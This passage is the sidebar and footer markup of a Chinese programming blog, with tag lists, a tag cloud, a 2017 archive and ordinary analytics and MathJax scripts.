class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/piecewise-construct/">piecewise_construct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pip/">pip</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pipe/">pipe</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/process/">process</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/prvalue/">prvalue</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pytesseract/">pytesseract</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qt/">qt</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/quit/">quit</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/">re</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/requests/">requests</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rvalue/">rvalue</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/signal/">signal</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stl/">stl</a><span class="tag-list-count">12</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tensorflow/">tensorflow</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/threading/">threading</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/trie树/">trie树</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uninstall/">uninstall</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unordered-multimap/">unordered_multimap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upcasting/">upcasting</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vbs/">vbs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vector/">vector</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vfptr/">vfptr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/">vmware</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wait/">wait</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xlvalue/">xlvalue</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/人工智能/">人工智能</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/仿函数/">仿函数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内存模型/">内存模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/决策树算法/">决策树算法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/分配器/">分配器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原理/">原理</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反斜杠/">反斜杠</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/回文字符串/">回文字符串</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/多态/">多态</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/字典树/">字典树</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/引用折叠/">引用折叠</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/排列组合/">排列组合</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/木马/">木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模式识别/">模式识别</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/正则表达式/">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/深度学习/">深度学习</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/病毒/">病毒</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔试/">笔试</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网络/">计算机网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/贪吃蛇/">贪吃蛇</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/贪心算法/">贪心算法</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/转载/">转载</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/迭代器/">迭代器</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/适配器/">适配器</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/1080ti/" style="font-size: 10.83px;">1080ti</a> <a href="/tags/Aggregate/" style="font-size: 10px;">Aggregate</a> <a href="/tags/Dell/" style="font-size: 11.67px;">Dell</a> <a href="/tags/Eassy/" style="font-size: 11.67px;">Eassy</a> <a href="/tags/Eval/" style="font-size: 10px;">Eval</a> <a href="/tags/Execute/" style="font-size: 10px;">Execute</a> <a href="/tags/ExecuteGlobal/" style="font-size: 10px;">ExecuteGlobal</a> <a href="/tags/Fibonacci/" style="font-size: 10px;">Fibonacci</a> <a href="/tags/IOU/" style="font-size: 10px;">IOU</a> <a href="/tags/Kolakoski/" style="font-size: 10px;">Kolakoski</a> <a href="/tags/MNIST/" style="font-size: 10.83px;">MNIST</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/PIL/" style="font-size: 10px;">PIL</a> <a href="/tags/POD/" style="font-size: 10px;">POD</a> <a href="/tags/QT/" style="font-size: 11.67px;">QT</a> <a href="/tags/Ubuntu/" style="font-size: 11.67px;">Ubuntu</a> <a href="/tags/YOLO/" style="font-size: 12.5px;">YOLO</a> <a href="/tags/acm/" style="font-size: 10px;">acm</a> <a href="/tags/advance/" style="font-size: 10px;">advance</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/array/" style="font-size: 10px;">array</a> <a href="/tags/asp/" style="font-size: 10px;">asp</a> <a href="/tags/auto/" style="font-size: 10.83px;">auto</a> <a href="/tags/auto/" style="font-size: 10px;">auto&</a> <a href="/tags/auto/" style="font-size: 10px;">auto&&</a> <a href="/tags/binding/" style="font-size: 10px;">binding</a> <a href="/tags/c/" style="font-size: 17.5px;">c</a> <a href="/tags/c/" style="font-size: 10px;">c#</a> <a href="/tags/cin/" style="font-size: 10px;">cin</a> <a href="/tags/constexpr/" style="font-size: 10px;">constexpr</a> <a href="/tags/cpp/" style="font-size: 20px;">cpp</a> <a href="/tags/cpp标准库/" style="font-size: 17.5px;">cpp标准库</a> <a href="/tags/cpp第二版/" style="font-size: 11.67px;">cpp第二版</a> <a href="/tags/cuda/" style="font-size: 10.83px;">cuda</a> <a href="/tags/cudnn/" style="font-size: 10.83px;">cudnn</a> <a href="/tags/darknet/" style="font-size: 12.5px;">darknet</a> <a href="/tags/dd/" style="font-size: 10px;">dd</a> <a href="/tags/default/" style="font-size: 10px;">default</a> <a href="/tags/downcasting/" style="font-size: 10px;">downcasting</a> <a href="/tags/error/" style="font-size: 11.67px;">error</a> <a href="/tags/estimator/" style="font-size: 11.67px;">estimator</a> <a href="/tags/forward/" style="font-size: 10px;">forward</a> <a href="/tags/game/" style="font-size: 10px;">game</a> <a href="/tags/glvalue/" style="font-size: 10px;">glvalue</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/identity/" style="font-size: 10px;">identity</a> <a href="/tags/lambda/" style="font-size: 10px;">lambda</a> <a href="/tags/linux/" style="font-size: 16.67px;">linux</a> <a href="/tags/lvalue/" style="font-size: 10px;">lvalue</a> <a href="/tags/map/" style="font-size: 10px;">map</a> <a href="/tags/mismatch/" style="font-size: 10px;">mismatch</a> <a href="/tags/move/" style="font-size: 10px;">move</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/namehiding/" style="font-size: 10.83px;">namehiding</a> <a href="/tags/network/" style="font-size: 12.5px;">network</a> <a href="/tags/next/" style="font-size: 10px;">next</a> <a href="/tags/notes/" style="font-size: 19.17px;">notes</a> <a href="/tags/numpy/" style="font-size: 12.5px;">numpy</a> <a href="/tags/office/" style="font-size: 10.83px;">office</a> <a href="/tags/oj/" style="font-size: 10px;">oj</a> <a href="/tags/opencv/" style="font-size: 14.17px;">opencv</a> <a href="/tags/oracle/" style="font-size: 10.83px;">oracle</a> <a href="/tags/overload/" style="font-size: 10.83px;">overload</a> <a href="/tags/override/" style="font-size: 10.83px;">override</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/piecewise-construct/" style="font-size: 10px;">piecewise_construct</a> <a href="/tags/pip/" style="font-size: 10px;">pip</a> <a href="/tags/pipe/" style="font-size: 10.83px;">pipe</a> <a href="/tags/process/" style="font-size: 10px;">process</a> <a href="/tags/prvalue/" style="font-size: 10px;">prvalue</a> <a href="/tags/pytesseract/" style="font-size: 10px;">pytesseract</a> <a href="/tags/python/" style="font-size: 18.33px;">python</a> <a href="/tags/qt/" style="font-size: 13.33px;">qt</a> <a href="/tags/quit/" style="font-size: 10px;">quit</a> <a href="/tags/re/" style="font-size: 11.67px;">re</a> <a href="/tags/requests/" style="font-size: 10.83px;">requests</a> <a href="/tags/rvalue/" style="font-size: 10px;">rvalue</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/signal/" style="font-size: 10.83px;">signal</a> <a href="/tags/sql/" style="font-size: 10.83px;">sql</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/stl/" style="font-size: 16.67px;">stl</a> <a href="/tags/tensorflow/" style="font-size: 15px;">tensorflow</a> <a href="/tags/thread/" style="font-size: 10.83px;">thread</a> <a href="/tags/threading/" style="font-size: 10px;">threading</a> <a href="/tags/trie树/" style="font-size: 10px;">trie树</a> <a href="/tags/uninstall/" style="font-size: 10.83px;">uninstall</a> <a href="/tags/unordered-multimap/" style="font-size: 10px;">unordered_multimap</a> <a href="/tags/upcasting/" style="font-size: 10px;">upcasting</a> <a href="/tags/vbs/" style="font-size: 10px;">vbs</a> <a href="/tags/vector/" style="font-size: 10px;">vector</a> <a href="/tags/vfptr/" style="font-size: 10px;">vfptr</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/wait/" style="font-size: 10px;">wait</a> <a href="/tags/xlvalue/" style="font-size: 10px;">xlvalue</a> <a href="/tags/人工智能/" style="font-size: 10px;">人工智能</a> <a href="/tags/仿函数/" style="font-size: 10px;">仿函数</a> <a href="/tags/内存模型/" style="font-size: 10px;">内存模型</a> <a href="/tags/决策树算法/" style="font-size: 10px;">决策树算法</a> <a href="/tags/分配器/" style="font-size: 10px;">分配器</a> <a href="/tags/原理/" style="font-size: 17.5px;">原理</a> <a href="/tags/反斜杠/" style="font-size: 10px;">反斜杠</a> <a href="/tags/回文字符串/" style="font-size: 10px;">回文字符串</a> <a href="/tags/多态/" style="font-size: 10px;">多态</a> <a href="/tags/字典树/" style="font-size: 10px;">字典树</a> <a href="/tags/引用折叠/" style="font-size: 10px;">引用折叠</a> <a href="/tags/排列组合/" style="font-size: 10px;">排列组合</a> <a href="/tags/木马/" style="font-size: 10px;">木马</a> <a href="/tags/机器学习/" style="font-size: 10.83px;">机器学习</a> <a href="/tags/模式识别/" style="font-size: 10px;">模式识别</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/深度学习/" style="font-size: 10px;">深度学习</a> <a href="/tags/漏洞/" style="font-size: 10px;">漏洞</a> <a href="/tags/病毒/" style="font-size: 10px;">病毒</a> <a href="/tags/笔试/" style="font-size: 11.67px;">笔试</a> <a href="/tags/算法/" style="font-size: 13.33px;">算法</a> <a href="/tags/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/计算机网络/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/贪吃蛇/" style="font-size: 10px;">贪吃蛇</a> <a href="/tags/贪心算法/" style="font-size: 10px;">贪心算法</a> <a href="/tags/转载/" style="font-size: 15.83px;">转载</a> <a href="/tags/迭代器/" style="font-size: 12.5px;">迭代器</a> <a href="/tags/适配器/" style="font-size: 10px;">适配器</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>

    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">十月 2017</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">19</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">20</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">27</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


  
</aside>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2018 coordinate All Rights Reserved.
        
            <span id="busuanzi_container_site_uv">
              本站访客数<span id="busuanzi_value_site_uv"></span>人次  
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
            </span>
          
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
